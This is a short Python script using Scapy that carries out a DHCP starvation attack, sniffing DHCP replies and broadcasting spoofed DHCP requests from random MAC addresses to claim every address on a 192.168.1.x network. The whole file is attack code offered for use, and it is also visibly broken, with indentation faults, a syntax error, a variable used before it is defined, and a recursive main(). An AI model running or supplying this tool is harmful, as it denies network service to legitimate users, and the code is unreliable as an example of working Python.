from scapy.all import *
from time import sleep
from threading import Thread

MAC = [""]
IP = []
DHCP_PACKET_FORMAT = [("message-type", "request"), ("requested_addr",
                       requested_addr), ("server_id", "192.168.1.1"), "end"]


def callback_dhcp_handle(pkt):
    """
    Function to handle  captured DHCP packets
    """
    if pkt.haslayer(DHCP):
        if pkt[DHCP].options[0][1] == 5 and pkt[IP].dst != "192.168.1.38":
        IP.append(pkt[IP].dst)
            print(str(pktIP].dst)+" registered")
        elif pkt[DHCP].options[0][1] == 6:
            print("NAK received")


def sniff_udp_packets():
    """
    Sniff UDP packets to port 67 and 68
    """
    sniff(filter="udp and (port 67 or port 68)",
          prn=callback_dhcp_handle, store=0)


def occupyIP():
    """
    Creates DHCPRequest packets and sends it to the DHCP server
    """
    for i in range(250):
        requested_addr = "192.168.1."+str(2+i)
        if requested_addr in IP:
            continue
        src_MAC = ""
        while src_MAC in MAC:
            src_MAC = RandMAC()

        MAC.append(src_MAC)
        pkt = Ether(src=src_MAC, dst="ff:ff:ff:ff:ff:ff")
        pkt /= IP(src="0.0.0.0", dst="255.255.255.255")
        pkt /= UDP(sport=68, dport=67)
        pkt /= BOOTP(chaddr="\x00\x00\x00\x00\x00\x00", xid=0x10000000)
        pkt /= DHCP(options=DHCP_PACKET_FORMAT)
        sendp(pkt)
        print("Trying to occupy " + requested_addr)
        sleep(0.2)  # interval to avoid congestion and packet loss


def main():
    thread = Thread(target=sniff_udp_packets)
    thread.start()
    print("Starting DHCP starvation...")
    while len(IP) < 100:
    occupyIP()
    print("TargetedIP address starved")
    main()
